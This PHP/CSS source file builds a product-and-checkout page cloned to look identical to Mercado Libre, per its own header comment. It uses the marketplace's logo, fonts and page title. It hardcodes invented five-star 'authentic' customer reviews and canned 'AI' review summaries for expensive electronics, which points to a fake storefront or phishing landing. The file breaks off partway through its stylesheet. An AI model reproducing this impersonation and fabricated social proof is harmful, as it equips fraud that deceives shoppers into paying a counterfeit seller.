<?php
/**
 * CLON MERCADOLIBRE — Checkout & Visualizador de Producto
 * Diseño idéntico a Mercado Libre oficial con sección de Preguntas, Opiniones, Pulgar SVG Oficial y Efecto Lupa Zoom
 */

require_once dirname(dirname(__DIR__)) . '/config.php';
require_once dirname(dirname(__DIR__)) . '/token_helper.php';

// Detectar si estamos en localhost o en Railway
$host_actual = $_SERVER['HTTP_HOST'] ?? '';
$is_localhost = (strpos($host_actual, 'localhost') !== false || strpos($host_actual, '127.0.0.1') !== false);
$base_landing_url = $is_localhost 
    ? '../../../SISTEMA_LANDINGS' 
    : rtrim(URL_LANDINGS, '/');

// 1. Obtener producto por token o landing slug
$token = $_GET['token'] ?? '';
$landing_slug = $_GET['landing'] ?? '';

$landing = null;
if (!empty($token)) {
    $landing = obtenerLandingPorToken($token, $pdo);
}

if (!$landing && !empty($landing_slug)) {
    $stmt = $pdo->prepare("SELECT * FROM landings WHERE slug = ? LIMIT 1");
    $stmt->execute([$landing_slug]);
    $landing = $stmt->fetch(PDO::FETCH_ASSOC);
}

if (!$landing) {
    $landing = [
        'slug' => 'dji-osmo-pocket-3',
        'producto' => 'DJI Osmo Pocket 3 Creator Combo | Cámara Gimbal 4K 120fps Sensor 1"',
        'precio' => 1850000,
        'imagenes' => json_encode([
            'img_1' => 'img/img_1.jpg',
            'img_2' => 'img/img_2.jpg',
            'img_3' => 'img/img_3.jpg',
            'img_4' => 'img/img_4.jpg'
        ]),
        'token' => 'f1d1838550ee35b801d95c0d95d7118a'
    ];
}

$producto = $landing['producto'] ?? 'DJI Osmo Pocket 3 Creator Combo';
$precio = (int)($landing['precio'] ?? 1850000);
$landing_slug = $landing['slug'] ?? 'dji-osmo-pocket-3';

// 2. Extraer imágenes del producto directamente desde la base de datos Supabase
$imagenes_raw = [];
if (!empty($landing['imagenes'])) {
    $decoded = is_array($landing['imagenes']) ? $landing['imagenes'] : json_decode($landing['imagenes'], true);
    if (is_array($decoded)) {
        $imagenes_raw = array_values($decoded);
    }
}

$lista_imagenes = [];
foreach ($imagenes_raw as $img) {
    if (empty($img)) continue;
    if (strpos($img, 'http://') === 0 || strpos($img, 'https://') === 0) {
        $lista_imagenes[] = $img;
    } else {
        $img_clean = ltrim($img, '/');
        $lista_imagenes[] = "{$base_landing_url}/landings/{$landing_slug}/{$img_clean}";
    }
}

// Eliminar duplicados manteniendo el orden exacto de las fotos de la galería
$lista_imagenes = array_values(array_unique($lista_imagenes));

if (empty($lista_imagenes)) {
    $lista_imagenes = [
        "{$base_landing_url}/landings/{$landing_slug}/img/img_1.jpg",
        "{$base_landing_url}/landings/{$landing_slug}/img/img_2.jpg",
        "{$base_landing_url}/landings/{$landing_slug}/img/img_3.jpg",
        "{$base_landing_url}/landings/{$landing_slug}/img/img_4.jpg"
    ];
}

$imagen_producto = $lista_imagenes[0];

// Formatear precios
$precio_formateado = number_format($precio, 0, ',', '.');
$precio_cuotas = number_format(round($precio / 12), 0, ',', '.');

// ─── Reseñas Auténticas con Fotos Reales para Todos los Productos ───
$resenas_con_fotos = [
    'dji-osmo-pocket-3' => [
        [
            'img' => 'img_reviews/dji_rev_1.jpg',
            'img2' => 'img_reviews/dji_rev_2.jpg',
            'stars' => '★★★★★',
            'titulo' => '¡Es hermosa! Tiene una pantalla sensacional.',
            'texto' => '¡Es hermosa! Tiene una pantalla sensacional y rotatoria. La estabilización es de otro mundo y el sensor de 1 pulgada en noche graba perfecto. ¡Me encantó!',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 3 semanas',
            'likes' => 42
        ],
        [
            'img' => 'img_reviews/dji_rev_2.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Cámara liviana, rápida, no se calienta',
            'texto' => 'Cámara liviana, rápida, no se calienta. Graba en 4K 120fps impecable y la batería dura más de 2 horas continuas con el transmisor de audio.',
            'ubicacion' => 'Medellín, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 35
        ],
        [
            'img' => 'img_reviews/dji_rev_3.jpg',
            'img2' => 'img_reviews/dji_rev_1.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Viene completamente sellado y original',
            'texto' => 'Viene en su caja original sellada con manuales, garantía y todos los accesorios completos del Creator Combo. Llegó súper rápido.',
            'ubicacion' => 'Bogotá, Colombia',
            'fecha' => 'Hace 2 meses',
            'likes' => 19
        ],
        [
            'img' => 'img_reviews/dji_rev_4.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Ergonomía perfecta y enfoque automático instantáneo',
            'texto' => 'El tamaño es ideal para llevar en el bolsillo. El seguimiento activo Face Track 6.0 nunca pierde el objetivo en movimiento.',
            'ubicacion' => 'Cali, Colombia',
            'fecha' => 'Hace 3 meses',
            'likes' => 28
        ]
    ],
    'airpods-max-wireless' => [
        [
            'img' => 'img_reviews/airpods_rev_1.jpg',
            'img2' => 'img_reviews/airpods_rev_2.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Sonido Hi-Fi y cancelación insuperable',
            'texto' => 'Los uso a diario en la oficina con mi Mac. La cancelación activa de ruido aísla todo por completo y las almohadillas son muy cómodas.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 2 semanas',
            'likes' => 38
        ],
        [
            'img' => 'img_reviews/airpods_rev_2.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Acabados premium en aluminio',
            'texto' => 'La calidad de construcción es impecable, el audio espacial te hace sentir en el cine y la batería rinde más de 20 horas.',
            'ubicacion' => 'Medellín, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 24
        ],
        [
            'img' => 'img_reviews/airpods_rev_3.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Comodidad total para largas sesiones',
            'texto' => 'La malla de la diadema distribuye el peso perfectamente. Excelente compra 100% original.',
            'ubicacion' => 'Bogotá, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 19
        ],
        [
            'img' => 'img_reviews/airpods_rev_4.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Graves profundos y nitidez cristalina',
            'texto' => 'Se conecta automáticamente con todos los dispositivos del ecosistema. Recomendadísimo.',
            'ubicacion' => 'Cali, Colombia',
            'fecha' => 'Hace 2 meses',
            'likes' => 31
        ]
    ],
    'dyson-airwrap-complete' => [
        [
            'img' => 'img_reviews/dyson_rev_1.jpg',
            'img2' => 'img_reviews/dyson_rev_2.jpg',
            'stars' => '★★★★★',
            'titulo' => 'El mejor moldeador, no maltrata el cabello',
            'texto' => 'Viene con todos los cabezales y accesorios completos en su estuche. Los rizos con el efecto Coanda duran todo el día sin resecar el pelo.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 52
        ],
        [
            'img' => 'img_reviews/dyson_rev_2.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Ahorra muchísimo tiempo al arreglarse',
            'texto' => 'Seca y peina al mismo tiempo dejando un acabado de peluquería brillante y sin frizz.',
            'ubicacion' => 'Medellín, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 41
        ],
        [
            'img' => 'img_reviews/dyson_rev_3.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Estuche de almacenamiento de lujo',
            'texto' => 'Impecable presentación, todos los barriles y cepillos encajan a la perfección.',
            'ubicacion' => 'Bogotá, Colombia',
            'fecha' => 'Hace 2 meses',
            'likes' => 26
        ],
        [
            'img' => 'img_reviews/dyson_rev_4.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => '100% original y motor digital potentísimo',
            'texto' => 'La potencia del flujo de aire es asombrosa, cuida el cuero cabelludo y el envío fue en 24h.',
            'ubicacion' => 'Barranquilla, Colombia',
            'fecha' => 'Hace 3 meses',
            'likes' => 33
        ]
    ],
    'smartwatch-ultra-titanium' => [
        [
            'img' => 'img_reviews/smartwatch_rev_1.jpg',
            'img2' => 'img_reviews/smartwatch_rev_2.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Muy resistente y pantalla ultra brillante',
            'texto' => 'La caja de titanio resiste golpes y la correa es súper cómoda. La batería me dura 4 días continuos con GPS.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 3 semanas',
            'likes' => 45
        ],
        [
            'img' => 'img_reviews/smartwatch_rev_2.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Sensores de frecuencia y oxígeno muy precisos',
            'texto' => 'Lo utilizo para entrenamientos y natación. La resistencia al agua IP68 y la pantalla AMOLED son espectaculares.',
            'ubicacion' => 'Medellín, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 28
        ],
        [
            'img' => 'img_reviews/smartwatch_rev_3.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Diseño imponente y corona giratoria suave',
            'texto' => 'Se siente muy sólido en la muñeca, notificaciones al instante y respuesta de llamadas perfecta.',
            'ubicacion' => 'Bogotá, Colombia',
            'fecha' => 'Hace 2 meses',
            'likes' => 22
        ],
        [
            'img' => 'img_reviews/smartwatch_rev_4.jpg',
            'img2' => '',
            'stars' => '★★★★★',
            'titulo' => 'Carga rápida inalámbrica magnética',
            'texto' => 'Carga de 0 a 100 en menos de 1 hora. El mejor smartwatch calidad-precio.',
            'ubicacion' => 'Bucaramanga, Colombia',
            'fecha' => 'Hace 3 meses',
            'likes' => 19
        ]
    ]
];

$reviews_actuales = $resenas_con_fotos[$landing_slug] ?? $resenas_con_fotos['dji-osmo-pocket-3'];

// Resumen de opiniones generado por IA
$resumenes_ia = [
    'dji-osmo-pocket-3' => 'El diseño del producto es excelente, con materiales de calidad y un sensor de 1 pulgada con colores nítidos. La estabilización en 3 ejes y la batería son destacables, durando más de 2 horas en 4K, y el dispositivo es muy funcional, cumpliendo con creces lo que ofrece a un precio competitivo.',
    'airpods-max-wireless' => 'El diseño del producto es excelente, con materiales de calidad acústica y cancelación activa de ruido insuperable. La batería es destacable, durando más de 20 horas continuas, y la conectividad es muy funcional, cumpliendo con lo que ofrece a un precio competitivo.',
    'dyson-airwrap-complete' => 'El diseño del producto es excelente, con materiales de calidad y efecto Coanda que moldea sin calor extremo. Los accesorios son muy funcionales, permitiendo rizos y alisados definidos, cumpliendo con creces las expectativas.',
    'smartwatch-ultra-titanium' => 'El diseño del producto es excelente, con caja de titanio resistente y pantalla AMOLED de colores lindos. La batería es destacable, durando más de 72 horas, y las funciones de salud y GPS son muy precisas y funcionales.'
];
$resumen_ia_texto = $resumenes_ia[$landing_slug] ?? 'El diseño del producto es excelente, con materiales de calidad y una pantalla con colores lindos. La batería es destacable, durando más de 24 horas, y el dispositivo es muy funcional, cumpliendo con lo que ofrece a un precio competitivo.';
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">

    <title><?= htmlspecialchars($producto) ?> | Mercado Libre</title>
    
    <link rel="preconnect" href="https://http2.mlstatic.com">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-blue-light: rgba(65,137,230,.12);
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-text-light: #999999;
            --ml-green: #00a650;
            --ml-border: #e6e6e6;
            --ml-bg: #ebebeb;
        }

        *, *::before, *::after {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            max-width: 100vw;
            overflow-x: hidden;
            font-family: 'Proxima Nova', -apple-system, 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
            -webkit-font-smoothing: antialiased;
        }

        /* ─── HEADER ─── */
        .ml-header {
            background-color: var(--ml-yellow);
            width: 100%;
            position: relative;
            z-index: 100;
        }

        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            min-height: 60px;
            display: flex;
            align-items: center;
            padding: 10px 16px;
            justify-content: space-between;
            gap: 16px;
            box-sizing: border-box;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: left center;
            flex-shrink: 0;
            text-decoration: none;
            display: block;
        }

        /* ─── LIVE SEARCH BOX CON API MERCADOLIBRE ─── */
        .nav-search-wrapper {
            flex: 1;
            max-width: 600px;
            position: relative;
        }

        .nav-search-form {
            width: 100%;
            height: 40px;
            background: #fff;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.2);
            border-radius: 2px;
            display: flex;
            align-items: center;
            position: relative;
            z-index: 101;
        }
        
        .nav-search-input {
            flex: 1;
            height: 100%;
            border: none;
            outline: none;
            padding: 0 14px;
            font-size: 15px;
            color: var(--ml-text-black);
            background: transparent;
            font-family: inherit;
        }

        .nav-search-btn {
            width: 46px;
            height: 100%;
            background: transparent;
            border: none;
            border-left: 1px solid var(--ml-border);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            transition: color 0.2s;
        }
        .nav-search-btn:hover { color: #333; }

        .nav-autosuggest-dropdown {
            position: absolute;
            top: 42px;
            left: 0;
            right: 0;
            background: #ffffff;
            border-radius: 4px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.18);
            border: 1px solid #e0e0e0;
            display: none;
            flex-direction: column;
            z-index: 1000;
            overflow: hidden;
        }
        .nav-autosuggest-dropdown.active {
            display: flex;
        }

        .nav-suggest-item {
            padding: 10px 14px;
            font-size: 14px;
            color: #333;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #f6f6f6;
            text-decoration: none;
            transition: background 0.15s;
        }
        .nav-suggest-item:hover {
            background-color: #f5f5f5;
            color: var(--ml-blue);
        }
        .nav-suggest-item svg {
            color: #999;
            flex-shrink: 0;
        }

        .nav-right-links {
            display: flex;
            align-items: center;
            gap: 16px;
            flex-shrink: 0;
        }

        .nav-pqr-link {
            color: #333333;
            text-decoration: none;
            font-size: 13.5px;
            font-weight: 600;
            transition: color 0.2s;
        }
        .nav-pqr-link:hover {
            color: var(--ml-blue);
        }

        /* ─── CONTENEDOR PRINCIPAL ─── */
        .main-container {
            max-width: 1200px;
            margin: 16px auto 0 auto;
            background-color: #fff;
            border-radius: 6px 6px 0 0;
            display: flex;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.08);
            overflow: hidden;
            width: 100%;
            box-sizing: border-box;
        }

        /* ─── GALERÍA CON EFECTO LUPA ZOOM (DESKTOP) ─── */
        .product-gallery {
            width: 50%;
            display: flex;
            padding: 24px;
            position: relative;
            box-sizing: border-box;
        }

        .gallery-thumbnails {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-right: 16px;
            width: 54px;
            flex-shrink: 0;
        }

        .thumbnail {
            width: 50px;
            height: 50px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            cursor: pointer;
            transition: border-color 0.2s ease, transform 0.2s ease;
            background-color: #ffffff;
        }

        .thumbnail.active, .thumbnail:hover {
            border-color: var(--ml-blue) !important;
            transform: scale(1.04);
        }

        .main-image-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 420px;
            max-height: 520px;
            position: relative;
            overflow: hidden;
            cursor: crosshair;
            border-radius: 6px;
            background: #ffffff;
        }

        .main-image {
            max-width: 100%;
            max-height: 500px;
            object-fit: contain;
            transition: transform 0.15s ease-out;
            transform-origin: center center;
            pointer-events: none;
            user-select: none;
        }

        .main-image-container.zoomed .main-image {
            transform: scale(2.4);
        }

        /* ─── INFO DEL PRODUCTO ─── */
        .product-info-wrapper {
            width: 50%;
            display: flex;
            flex-direction: row;
            box-sizing: border-box;
        }

        .product-info-center {
            width: 55%;
            padding: 24px 20px;
            box-sizing: border-box;
        }

        .product-title {
            font-size: 22px;
            font-weight: 600;
            margin: 0 0 10px 0;
            color: var(--ml-text-black);
            line-height: 1.25;
            word-break: break-word;
        }

        .price-container {
            margin: 14px 0 6px 0;
            display: flex;
            align-items: baseline;
        }

        .price-currency {
            font-size: 20px;
            font-weight: 400;
            margin-right: 2px;
        }

        .price-amount {
            font-size: 36px;
            font-weight: 300;
        }

        .product-buybox {
            width: 45%;
            padding: 24px 20px;
            border-left: 1px solid var(--ml-border);
            margin: 16px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            height: fit-content;
            box-sizing: border-box;
            background: #ffffff;
        }

        .btn {
            height: 48px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color .2s;
            border: none;
            width: 100%;
            text-decoration: none;
            font-family: inherit;
        }

        .btn-primary { background-color: var(--ml-blue); color: #fff; }
        .btn-primary:hover { background-color: var(--ml-blue-hover); }
        .btn-secondary { background-color: var(--ml-blue-light); color: var(--ml-blue); }
        .btn-secondary:hover { background-color: rgba(65,137,230,.25); }

        /* ─── SECCIÓN DE OPINIONES DEL PRODUCTO ─── */
        .ml-opinions-wrapper {
            max-width: 1200px;
            margin: 0 auto 40px auto;
            background: #ffffff;
            padding: 36px;
            border-radius: 0 0 6px 6px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.08);
            display: flex;
            gap: 48px;
            box-sizing: border-box;
            width: 100%;
        }

        /* COLUMNA IZQUIERDA */
        .ml-opinions-left {
            width: 290px;
            flex-shrink: 0;
        }

        .ml-opinions-title {
            font-size: 24px;
            font-weight: 400;
            color: var(--ml-text-black);
            margin: 0 0 18px 0;
        }

        .ml-score-row {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 12px;
        }

        .ml-big-score {
            font-size: 52px;
            font-weight: 600;
            color: var(--ml-blue);
            line-height: 1;
        }

        .ml-score-meta-stars {
            color: var(--ml-blue);
            font-size: 15px;
            letter-spacing: 2px;
            margin-bottom: 4px;
        }

        .ml-score-total-count {
            font-size: 13px;
            color: var(--ml-text-gray);
        }

        .ml-foreign-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: var(--ml-text-gray);
            margin-bottom: 22px;
        }

        .ml-foreign-badge .info-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 14px;
            height: 14px;
            border-radius: 50%;
            border: 1.5px solid var(--ml-blue);
            color: var(--ml-blue);
            font-size: 9px;
            font-weight: 700;
        }

        /* BARRAS DE RATING */
        .ml-bars-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .ml-bar-item {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .ml-bar-track {
            flex: 1;
            height: 4px;
            background-color: #f0f0f0;
            border-radius: 2px;
            overflow: hidden;
        }

        .ml-bar-fill {
            height: 100%;
            background-color: #333333;
            border-radius: 2px;
        }

        .ml-bar-fill.light {
            background-color: #cccccc;
        }

        .ml-bar-label {
            width: 24px;
            font-size: 12px;
            color: var(--ml-text-gray);
            text-align: right;
        }

        /* COLUMNA DERECHA */
        .ml-opinions-right {
            flex: 1;
        }

        .ml-photos-strip-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--ml-text-black);
            margin: 0 0 14px 0;
        }

        /* CARRUSEL DE FOTOS */
        .ml-photos-carousel-row {
            display: flex;
            align-items: center;
            gap: 14px;
            position: relative;
            margin-bottom: 22px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: none;
            padding-bottom: 4px;
        }
        .ml-photos-carousel-row::-webkit-scrollbar {
            display: none;
        }

        .ml-photo-card {
            width: 112px;
            height: 154px;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            cursor: pointer;
            flex-shrink: 0;
            background-color: #f3f4f6;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .ml-photo-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
        }

        .ml-photo-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .ml-photo-card-rating {
            position: absolute;
            bottom: 8px;
            left: 8px;
            background: rgba(0, 0, 0, 0.65);
            color: #ffffff;
            font-size: 11px;
            font-weight: 700;
            padding: 2px 6px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .ml-carousel-nav-btn {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #ffffff;
            border: none;
            box-shadow: 0 2px 8px rgba(0,0,0,0.18);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-left: -8px;
            z-index: 2;
            transition: transform 0.2s;
            flex-shrink: 0;
        }
        .ml-carousel-nav-btn:hover {
            transform: scale(1.06);
        }

        /* FILTROS PILLS */
        .ml-filter-pills-row {
            display: flex;
            gap: 10px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .ml-filter-pill {
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 20px;
            padding: 6px 14px;
            font-size: 13px;
            font-weight: 400;
            color: var(--ml-text-black);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.15s;
            font-family: inherit;
        }
        .ml-filter-pill:hover {
            background-color: #f7f7f7;
            border-color: #ccc;
        }

        /* AI SUMMARY BLOCK */
        .ml-ai-block {
            margin-bottom: 30px;
            background-color: #fafafa;
            border: 1px solid #f0f0f0;
            border-radius: 8px;
            padding: 16px 20px;
        }

        .ml-ai-header {
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .ml-ai-heading {
            font-size: 15px;
            font-weight: 600;
            color: var(--ml-text-black);
        }

        .ml-ai-subcount {
            font-size: 12px;
            color: var(--ml-text-light);
        }

        .ml-ai-paragraph {
            font-size: 13.5px;
            line-height: 1.5;
            color: var(--ml-text-black);
            margin: 8px 0 0 0;
            max-width: 680px;
        }

        /* LISTA DETALLADA DE RESEÑAS */
        .ml-reviews-list {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        .ml-review-card-row {
            padding-bottom: 24px;
            border-bottom: 1px solid #f0f0f0;
        }

        .ml-rev-header-line {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            flex-wrap: wrap;
            gap: 6px;
        }

        .ml-rev-stars-blue {
            color: var(--ml-blue);
            font-size: 13px;
            letter-spacing: 2px;
        }

        .ml-rev-meta-right {
            font-size: 12px;
            color: var(--ml-text-light);
        }

        .ml-rev-thumbs-row {
            display: flex;
            gap: 10px;
            margin: 12px 0;
            flex-wrap: wrap;
        }

        .ml-rev-thumb-box {
            width: 86px;
            height: 86px;
            border-radius: 6px;
            overflow: hidden;
            cursor: pointer;
            border: 1px solid var(--ml-border);
            background: #f5f5f5;
        }

        .ml-rev-thumb-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .ml-rev-comment-text {
            font-size: 14px;
            line-height: 1.45;
            color: var(--ml-text-black);
            margin: 8px 0 12px 0;
        }

        /* BOTÓN ÚTIL CON EL SVG OFICIAL DE MERCADO LIBRE (CORREGIDO ANCHO) */
        .ml-rev-useful-btn {
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            padding: 5px 14px;
            font-size: 12px;
            font-weight: 600;
            color: var(--ml-text-black);
            cursor: pointer;
            display: inline-flex !important;
            width: fit-content !important;
            max-width: fit-content !important;
            align-self: flex-start !important;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
            font-family: inherit;
        }
        .ml-rev-useful-btn svg {
            color: rgba(0, 0, 0, 0.55);
            transition: color 0.2s;
        }
        .ml-rev-useful-btn:hover {
            background-color: #f7f7f7;
        }
        .ml-rev-useful-btn.liked {
            border-color: var(--ml-blue);
            color: var(--ml-blue);
            background-color: var(--ml-blue-light);
        }
        .ml-rev-useful-btn.liked svg {
            color: var(--ml-blue);
        }

        /* ─── MODAL FLOTANTE DE OPINIONES ─── */
        .ml-modal-backdrop {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .ml-modal-backdrop.open {
            display: flex;
        }

        .ml-modal-window {
            background: #ffffff;
            width: 100%;
            max-width: 860px;
            height: 540px;
            border-radius: 8px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 12px 36px rgba(0,0,0,0.3);
            animation: modalFadeIn 0.2s ease-out;
        }

        @keyframes modalFadeIn {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }

        .ml-modal-topbar {
            height: 52px;
            padding: 0 20px;
            border-bottom: 1px solid #f0f0f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .ml-modal-back-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 15px;
            font-weight: 600;
            color: var(--ml-text-black);
            cursor: pointer;
            border: none;
            background: none;
            font-family: inherit;
        }

        .ml-modal-close-icon {
            font-size: 18px;
            color: var(--ml-blue);
            cursor: pointer;
            border: none;
            background: none;
            padding: 4px;
        }

        .ml-modal-content-split {
            flex: 1;
            display: flex;
            height: calc(100% - 52px);
        }

        .ml-modal-left-pane {
            width: 56%;
            border-right: 1px solid #f0f0f0;
            padding: 14px 20px 10px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            background: #ffffff;
            box-sizing: border-box;
        }

        .ml-modal-photo-stage {
            flex: 1;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .ml-modal-photo-stage img {
            max-height: 340px;
            max-width: 100%;
            object-fit: contain;
            border-radius: 4px;
        }

        .ml-modal-counter {
            font-size: 12px;
            color: var(--ml-text-gray);
            margin: 6px 0;
            font-weight: 600;
        }

        .ml-modal-thumbs-carousel {
            display: flex;
            gap: 6px;
            overflow-x: auto;
            width: 100%;
            max-width: 420px;
            padding: 4px;
            box-sizing: border-box;
        }

        .ml-modal-thumb-item {
            width: 44px;
            height: 44px;
            border-radius: 4px;
            overflow: hidden;
            border: 2px solid transparent;
            cursor: pointer;
            flex-shrink: 0;
            opacity: 0.65;
            transition: all 0.2s;
        }
        .ml-modal-thumb-item.active {
            border-color: var(--ml-blue);
            opacity: 1;
        }
        .ml-modal-thumb-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .ml-modal-right-pane {
            width: 44%;
            padding: 24px 24px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            background: #ffffff;
            box-sizing: border-box;
        }

        .ml-modal-stars {
            color: var(--ml-blue);
            font-size: 14px;
            letter-spacing: 2px;
            margin-bottom: 14px;
        }

        .ml-modal-text {
            font-size: 14px;
            line-height: 1.5;
            color: var(--ml-text-black);
            margin-bottom: 10px;
        }

        .ml-modal-meta {
            font-size: 12px;
            color: var(--ml-text-light);
            margin-bottom: 22px;
        }

        /* ─── FOOTER CON HIPERVÍNCULOS OFICIALES ─── */
        .ml-footer {
            background-color: #ffffff;
            border-top: 1px solid var(--ml-border);
            padding: 30px 16px 40px 16px;
            font-size: 12px;
            color: var(--ml-text-gray);
            line-height: 1.6;
        }
        .ml-footer-container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .ml-footer-links {
            display: flex;
            gap: 16px;
            margin-bottom: 14px;
            flex-wrap: wrap;
        }
        .ml-footer-links a {
            color: var(--ml-text-black);
            text-decoration: none;
            transition: color 0.15s;
        }
        .ml-footer-links a:hover {
            color: var(--ml-blue);
            text-decoration: underline;
        }

        /* ─── STICKY MOBILE BOTTOM BAR ─── */
        .ml-mobile-bottom-bar {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #ffffff;
            border-top: 1px solid var(--ml-border);
            padding: 10px 16px;
            z-index: 999;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.08);
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            box-sizing: border-box;
        }

        .ml-mobile-price-col {
            display: flex;
            flex-direction: column;
        }

        .ml-mobile-price-label {
            font-size: 11px;
            color: var(--ml-text-gray);
            text-transform: uppercase;
        }

        .ml-mobile-price-val {
            font-size: 18px;
            font-weight: 700;
            color: var(--ml-text-black);
        }

        .ml-mobile-buy-btn {
            flex: 1;
            max-width: 190px;
            height: 44px;
            font-size: 15px;
        }

        /* ─── RESPONSIVE BREAKPOINTS ─── */
        @media (max-width: 1024px) {
            .main-container {
                flex-direction: column;
                margin: 0 auto;
                border-radius: 0;
                box-shadow: none;
            }
            .product-gallery {
                width: 100%;
                flex-direction: column-reverse;
                padding: 16px 12px;
            }
            .gallery-thumbnails {
                flex-direction: row;
                width: 100%;
